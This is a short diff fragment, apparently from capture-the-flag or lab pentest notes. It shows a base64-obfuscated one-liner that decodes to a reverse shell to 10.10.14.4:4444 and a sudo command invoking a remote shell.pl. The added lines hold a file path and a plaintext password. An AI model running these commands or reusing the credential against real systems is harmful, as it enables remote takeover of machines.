@@ -44,6 +44,11 @@ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQo='|base64 -d|bash|
 ```
 
 ```
+8000/Windows%20Event%20Logs%20for%20Analysis.msg
+Def@ultf0r3nz!csPa$$
+```
+
+```
 sudo /usr/bin/binary 10.10.14.4/shell.pl lDnxUysaQn
 ```
 
